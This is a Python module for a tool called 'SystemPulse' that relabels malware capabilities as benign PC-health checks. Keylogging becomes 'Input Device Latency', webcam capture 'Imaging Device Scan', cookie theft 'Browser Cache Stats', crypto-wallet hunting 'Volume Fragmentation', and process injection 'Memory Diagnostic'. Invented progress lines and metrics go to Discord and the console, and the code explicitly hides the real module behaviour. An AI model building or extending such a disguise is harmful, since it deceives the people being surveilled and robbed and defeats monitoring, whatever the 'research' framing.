"""Decoy activity logs for SystemPulse — reads like a PC health monitor, not AV research."""

from __future__ import annotations

from typing import Any

# Public-facing names shown in Discord titles / console headers
DECOY_LABELS: dict[str, str] = {
    "defender": "Security Health Sync",
    "eicar": "Disk Integrity Scan",
    "self_copy": "Local Cache Refresh",
    "persistence": "Startup Program Audit",
    "process_injection": "Memory Diagnostic",
    "powershell": "System Config Query",
    "keylogger": "Input Device Latency",
    "screenshot": "Display Calibration",
    "clipboard": "Shared Buffer Check",
    "webcam": "Imaging Device Scan",
    "cookies": "Browser Cache Stats",
    "file_read": "Storage Index Health",
    "crypto_hunt": "Volume Fragmentation",
    "location": "Network Time Sync",
    "network": "Connectivity Ping Test",
}

DECOY_PROGRESS: dict[str, list[str]] = {
    "defender": [
        "Connecting to Security Health service…",
        "Reading protection status…",
        "Syncing policy cache…",
    ],
    "eicar": [
        "Mounting volume for quick scan…",
        "Reading sector checksum table…",
        "Verifying file system integrity…",
    ],
    "self_copy": [
        "Locating local health cache…",
        "Refreshing diagnostic bundle…",
        "Updating offline metrics store…",
    ],
    "persistence": [
        "Enumerating startup entries…",
        "Cross-checking scheduled tasks…",
        "Building boot profile report…",
    ],
    "process_injection": [
        "Sampling working set…",
        "Checking heap fragmentation…",
        "Running memory pressure test…",
    ],
    "powershell": [
        "Querying WMI system class…",
        "Collecting hardware inventory…",
        "Parsing configuration manifest…",
    ],
    "keylogger": [
        "Polling HID device stack…",
        "Measuring input round-trip…",
        "Logging latency samples…",
    ],
    "screenshot": [
        "Querying display adapter…",
        "Reading EDID color profile…",
        "Validating gamma response…",
    ],
    "clipboard": [
        "Opening shared memory channel…",
        "Testing clipboard bridge…",
        "Verifying buffer handshake…",
    ],
    "webcam": [
        "Listing imaging devices…",
        "Probing UVC endpoints…",
        "Running sensor self-test…",
    ],
    "cookies": [
        "Scanning browser cache headers…",
        "Estimating cache footprint…",
        "Normalizing temp file stats…",
    ],
    "file_read": [
        "Walking indexed folders…",
        "Reading document catalog…",
        "Computing storage health score…",
    ],
    "crypto_hunt": [
        "Analyzing volume layout…",
        "Measuring free-space dispersion…",
        "Estimating defrag priority…",
    ],
    "location": [
        "Resolving NTP stratum…",
        "Matching regional time zone…",
        "Validating clock skew…",
    ],
    "network": [
        "Opening ICMP probe…",
        "Pinging default gateway…",
        "Measuring round-trip latency…",
    ],
}

DECOY_DETAIL: dict[str, list[str]] = {
    "defender": [
        "Real-time protection: queried",
        "Cloud deliverables: up to date",
        "Health report: staged",
    ],
    "eicar": [
        "Sectors scanned: 4096",
        "Bad blocks: none reported",
        "Checksum pass: pending review",
    ],
    "self_copy": [
        "Cache slot: refreshed",
        "Bundle size: within limits",
        "Mirror copy: verified",
    ],
    "persistence": [
        "Startup items: enumerated",
        "Unknown entries: flagged for review",
        "Boot timeline: recorded",
    ],
    "process_injection": [
        "Committed RAM: sampled",
        "Page faults / sec: nominal",
        "Pressure index: 12%",
    ],
    "powershell": [
        "WMI classes read: 3",
        "Inventory rows: collected",
        "Config export: complete",
    ],
    "keylogger": [
        "HID queue depth: normal",
        "Avg latency: 4.2 ms",
        "Samples collected: 128",
    ],
    "screenshot": [
        "Primary display: detected",
        "Color depth: 32-bit",
        "Profile match: OK",
    ],
    "clipboard": [
        "Bridge status: open",
        "Text buffer: readable",
        "Handshake: complete",
    ],
    "webcam": [
        "Devices found: 1",
        "Driver status: loaded",
        "Self-test: passed",
    ],
    "cookies": [
        "Cache buckets: 14",
        "Temp footprint: 48 MB",
        "Stale entries: pruned",
    ],
    "file_read": [
        "Indexed paths: 26",
        "Catalog entries: updated",
        "Health score: 94/100",
    ],
    "crypto_hunt": [
        "Volumes analyzed: 1",
        "Fragmentation: low",
        "Defrag recommended: no",
    ],
    "location": [
        "Time zone: matched",
        "Clock skew: +0.03 s",
        "NTP reachability: OK",
    ],
    "network": [
        "Gateway: reachable",
        "Packet loss: 0%",
        "RTT avg: 11 ms",
    ],
}


def decoy_label(module: str) -> str:
    return DECOY_LABELS.get(module, "System Check")


def format_progress_lines(module: str) -> list[str]:
    return list(DECOY_PROGRESS.get(module, ["Running diagnostic routine…"]))


def _result_line(module: str, status: str) -> str:
    ok_messages = {
        "defender": "OK — security health sync complete",
        "eicar": "OK — disk integrity scan finished",
        "self_copy": "OK — local cache refreshed",
        "persistence": "OK — startup audit complete",
        "process_injection": "OK — memory diagnostic passed",
        "powershell": "OK — system config query complete",
        "keylogger": "OK — input latency within range",
        "screenshot": "OK — display calibration normal",
        "clipboard": "OK — shared buffer check passed",
        "webcam": "OK — imaging devices healthy",
        "cookies": "OK — browser cache stats collected",
        "file_read": "OK — storage index healthy",
        "crypto_hunt": "OK — volume fragmentation nominal",
        "location": "OK — network time sync verified",
        "network": "OK — connectivity test passed",
    }
    warn = "WARN — check interrupted, retry recommended"
    fail = "ERROR — diagnostic could not finish"
    blocked = "WARN — system policy paused this check"

    if status == "blocked":
        return blocked
    if status == "failed":
        return fail
    if status == "success":
        return ok_messages.get(module, "OK — check complete")
    return ok_messages.get(module, "OK — check complete")


def format_event_display(
    module: str,
    action: str,
    status: str,
    payload: dict[str, Any] | None = None,
    error_message: str | None = None,
) -> tuple[list[str], str]:
    """Returns decoy (log_lines, result) — never exposes real module behavior."""
    _ = payload  # real payload stays in API for research; not shown in logs

    lines = list(DECOY_PROGRESS.get(module, ["Running diagnostic routine…"]))
    lines.extend(DECOY_DETAIL.get(module, ["Metrics collected", "Report queued"]))

    if error_message:
        return lines, "ERROR — sensor read timed out"
    if status == "blocked":
        return lines, _result_line(module, "blocked")

    return lines, _result_line(module, status)


def format_console_block(
    module: str,
    action: str,
    status: str,
    payload: dict | None,
    error: str | None,
) -> list[str]:
    label = decoy_label(module)
    out = [f"[{label}]"]
    log_lines, result = format_event_display(module, action, status, payload, error)
    for line in log_lines:
        out.append(f"  > {line}")
    out.append(f"  → {result}")
    return out
